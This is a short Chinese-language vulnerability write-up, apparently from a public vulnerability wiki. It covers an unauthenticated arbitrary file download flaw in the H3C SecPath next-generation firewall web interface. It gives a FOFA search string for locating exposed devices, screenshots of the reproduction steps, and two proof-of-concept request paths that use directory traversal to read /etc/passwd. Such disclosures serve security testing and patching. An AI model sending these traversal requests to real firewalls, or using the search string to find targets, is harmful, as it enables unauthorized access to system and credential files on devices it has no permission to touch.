# H3C SecPath 下一代防火墙  任意文件下载漏洞

## 漏洞描述

H3C SecPath 下一代防火墙  存在功能点导致任意文件下载漏洞，攻击者通过漏洞可以获取敏感信息

## 漏洞影响

> [!NOTE]
>
> H3C SecPath

## FOFA

> [!NOTE]
>
> title="Web user login"

## 漏洞复现

登录页面如下

![image-20210604115315360](http://wikioss.peiqi.tech/vuln/image-20210604115315360.png?x-oss-process=image/auto-orient,1/quality,q_90/watermark,image_c2h1aXlpbi9zdWkucG5nP3gtb3NzLXByb2Nlc3M9aW1hZ2UvcmVzaXplLFBfMTQvYnJpZ2h0LC0zOS9jb250cmFzdCwtNjQ,g_se,t_17,x_1,y_10)

存在漏洞点的功能有两个

![image-20210604115351314](http://wikioss.peiqi.tech/vuln/image-20210604115351314.png?x-oss-process=image/auto-orient,1/quality,q_90/watermark,image_c2h1aXlpbi9zdWkucG5nP3gtb3NzLXByb2Nlc3M9aW1hZ2UvcmVzaXplLFBfMTQvYnJpZ2h0LC0zOS9jb250cmFzdCwtNjQ,g_se,t_17,x_1,y_10)

点击下载抓包更改请求

![image-20210604115431531](http://wikioss.peiqi.tech/vuln/image-20210604115431531.png?x-oss-process=image/auto-orient,1/quality,q_90/watermark,image_c2h1aXlpbi9zdWkucG5nP3gtb3NzLXByb2Nlc3M9aW1hZ2UvcmVzaXplLFBfMTQvYnJpZ2h0LC0zOS9jb250cmFzdCwtNjQ,g_se,t_17,x_1,y_10)

并且在未身份验证的情况中，也可以请求下载敏感文件

验证POC

```
/webui/?g=sys_dia_data_check&file_name=../../etc/passwd

/webui/?
g=sys_capture_file_download&name=../../../../../../../../etc/passwd 
```

​	